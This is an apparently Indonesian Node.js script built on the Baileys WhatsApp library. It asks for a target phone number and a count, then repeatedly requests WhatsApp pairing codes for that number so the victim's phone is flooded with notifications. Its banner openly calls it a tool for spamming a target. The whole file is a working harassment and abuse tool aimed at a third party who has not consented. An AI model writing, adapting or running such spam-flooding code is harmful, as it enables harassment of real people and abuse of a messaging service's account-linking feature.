const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");


    const color = [
        '\x1b[31m', 
        '\x1b[32m', 
        '\x1b[33m', 
        '\x1b[34m', 
        '\x1b[35m', 
        '\x1b[36m'
    ];
    const wColor = color[Math.floor(Math.random() * color.length)];

const xColor = '\x1b[0m';

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { rl.question(text, resolve) });
};

async function KleeProject() {
    const { state } = await useMultiFileAuthState('./69/session');
    const KleeBotInc = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });
    try {
        // Ask for phone number
        const phoneNumber = await question(color + 'Masukin No Target: ' + xColor);
        
        // Request the desired number of pairing codes
        const KleeCodes = parseInt(await question(color + 'Masukin Jumlah Spam: '+ xColor));

        if (isNaN(KleeCodes) || KleeCodes <= 0) {
            console.log('example : 1000.');
            return;
        }

        // Get and display pairing code
        for (let i = 0; i < KleeCodes; i++) {
            try {
                let code = await KleeBotInc.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                console.log(color + `Sukses Mengirim Spam Ke ${phoneNumber} Total Spam: [${i + 1}/${KleeCodes}]`+ xColor);
            } catch (error) {
                console.error('Error:', error.message);
            }
        }
    } catch (error) {
                 console.error('error') ;
}

    return KleeBotInc;
}
console.log(color + `
❏============================❏
█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
⡏⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿
⣿⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠁⠀⣿
⣿⣧⡀⠀⠀⠀⠀⠙⠿⠿⠿⠻⠿⠿⠟⠿⠛⠉⠀⠀⠀⠀⠀⣸⣿
⣿⣿⣷⣄⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿
⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣴⣿⣿⣿⣿
⣿⣿⣿⡟⠀⠀⢰⣹⡆⠀⠀⠀⠀⠀⠀⣭⣷⠀⠀⠀⠸⣿⣿⣿⣿
⣿⣿⣿⠃⠀⠀⠈⠉⠀⠀⠤⠄⠀⠀⠀⠉⠁⠀⠀⠀⠀⢿⣿⣿⣿
⣿⣿⣿⢾⣿⣷⠀⠀⠀⠀⡠⠤⢄⠀⠀⠀⠠⣿⣿⣷⠀⢸⣿⣿⣿
⣿⣿⣿⡀⠉⠀⠀⠀⠀⠀⢄⠀⢀⠀⠀⠀⠀⠉⠉⠁⠀⠀⣿⣿⣿
⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿
⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿ 
█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
 • ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛᴏᴏʟs ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ
  sᴄʀɪᴘᴛ ʙʏ ʀɪɪsᴛᴏʀᴇ ɪᴅ
✎ ᴊᴀɴɢᴀɴ sᴀʟᴀʜ ɢᴜɴᴀᴋᴀɴ sᴄʀɪᴘᴛ ɪɴɪ
█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
sɪʟᴀʜᴋᴀɴ ɪᴋᴜᴛɪɴ ɪɴᴛʀᴜᴋsɪ ɪɴɪ :
- ᴜɴᴛᴜᴋ ᴍᴇɴɢsᴘᴀᴍ ᴛᴀʀɢᴇᴛ ᴜsᴀʜᴀᴋᴀɴ
  ɢᴜɴᴀᴋᴀɴ 62xxxxx 
- ᴜɴᴛᴜᴋ ᴊᴜᴍʟᴀʜ sᴘᴀᴍ sɪʟᴀʜᴋᴀɴ ᴀᴛᴜʀ
  sᴇsᴜᴀɪ sᴇʟᴇʀᴀ ᴍᴀsɪɴɢ ᴍᴀsɪɴɢ
█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
❏============================❏` + xColor);

KleeProject();
